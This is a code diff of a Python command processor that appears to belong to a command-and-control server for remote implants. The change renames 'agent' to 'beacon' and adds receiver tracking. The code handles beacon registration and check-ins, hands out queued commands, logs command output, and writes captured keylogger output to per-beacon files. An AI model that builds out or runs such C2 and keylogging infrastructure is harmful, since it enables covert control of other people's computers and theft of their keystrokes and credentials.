@@ -1,38 +1,39 @@
 from pathlib import Path
 from datetime import datetime
-from database import AgentRepository
+from database import BeaconRepository
 from config import ServerConfig
 
 class CommandProcessor:
     """Processes and validates agent commands"""
-    def __init__(self, agent_repository: AgentRepository):
-        self.agent_repository = agent_repository
+    def __init__(self, beacon_repository: BeaconRepository):
+        self.beacon_repository = beacon_repository
 
-    def process_registration(self, agent_id: str, computer_name: str) -> str:
+    def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
         import utils  # Import here to avoid circular imports
-        self.agent_repository.update_agent_status(agent_id, 'online', computer_name)
+        self.beacon_repository.update_agent_status(beacon_id, 'online', computer_name, receiver_id)
         if utils.logger:
-            utils.logger.log_message(f"Agent Registration: {agent_id} ({computer_name})")
+            display_name = receiver_name or receiver_id or "Unknown"
+            utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}")
         return "Registration successful"
 
-    def process_action_request(self, agent_id: str) -> str:
+    def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None) -> str:
         import utils  # Import here to avoid circular imports
-        agent = self.agent_repository.get_agent(agent_id)
-        self.agent_repository.update_agent_status(agent_id, "online")
-        if not agent.pending_command:
+        beacon = self.beacon_repository.get_agent(beacon_id)
+        self.beacon_repository.update_agent_status(beacon_id, "online", receiver_id=receiver_id)
+        if not beacon.pending_command:
             if utils.logger:
-                utils.logger.log_message(f"Check In: {agent_id} - No pending commands")
+                utils.logger.log_message(f"Check In: {beacon_id} - No pending commands")
             return "no_pending_commands"
         
-        if not agent:
+        if not beacon:
             return ""
 
-        command = agent.pending_command
-        self.agent_repository.update_agent_command(agent_id, None)
+        command = beacon.pending_command
+        self.beacon_repository.update_agent_command(beacon_id, None)
 
         return self._format_command_response(command)
 
-    def process_command_output(self, agent_id: str, output: str = "", config=None) -> str:
+    def process_command_output(self, beacon_id: str, output: str = "", config=None) -> str:
         """Process command output from an agent"""
         import utils  # Import here to avoid circular imports
         if config is None:
@@ -40,36 +41,36 @@ class CommandProcessor:
             config = ServerConfig()
         try:
             # Store the output in the agent's output file
-            output_file = Path(config.LOGS_FOLDER) / f"output_{agent_id}.txt"
+            output_file = Path(config.LOGS_FOLDER) / f"output_{beacon_id}.txt"
             with open(output_file, 'a', encoding='utf-8') as f:
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 f.write(f"[{timestamp}] {output}")
             
             # Clear the pending command since received output
-            self.agent_repository.update_agent_command(agent_id, None)
+            self.beacon_repository.update_agent_command(beacon_id, None)
             
             # Update the agent's output file path if needed
-            agent = self.agent_repository.get_agent(agent_id)
-            if agent and not agent.output_file:
-                self.agent_repository.update_agent_response(
-                    agent_id,
+            beacon = self.beacon_repository.get_agent(beacon_id)
+            if beacon and not beacon.output_file:
+                self.beacon_repository.update_agent_response(
+                    beacon_id,
                     str(output_file)
                 )
             
             return "Output received"
         except Exception as e:
             if utils.logger:
-                utils.logger.log_message(f"Command Output Error: {agent_id} - {str(e)}")
+                utils.logger.log_message(f"Command Output Error: {beacon_id} - {str(e)}")
             return f"Error processing output: {str(e)}"
         
-    def process_keylogger_output(self, agent_id: str, output: str = "", config=None) -> str:
+    def process_keylogger_output(self, beacon_id: str, output: str = "", config=None) -> str:
         """Process KeyLogger output from an agent"""
         import utils  # Import here to avoid circular imports
         if config is None:
             from config import ServerConfig
             config = ServerConfig()
         try:
-            output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{agent_id}.txt"
+            output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{beacon_id}.txt"
             
             # Handle special character encodings
             special_chars = {
@@ -94,8 +95,8 @@ class CommandProcessor:
                 utils.logger.log_message(f"Error processing keylogger output: {e}")
             return f"Error: {e}"
 
-    def process_download_status(self, agent_id: str, filename: str, status: str) -> str:
-        self.agent_repository.update_agent_response(agent_id, f"{status}|{filename}")
+    def process_download_status(self, beacon_id: str, filename: str, status: str) -> str:
+        self.beacon_repository.update_agent_response(beacon_id, f"{status}|{filename}")
         return "Status updated"
 
     @staticmethod
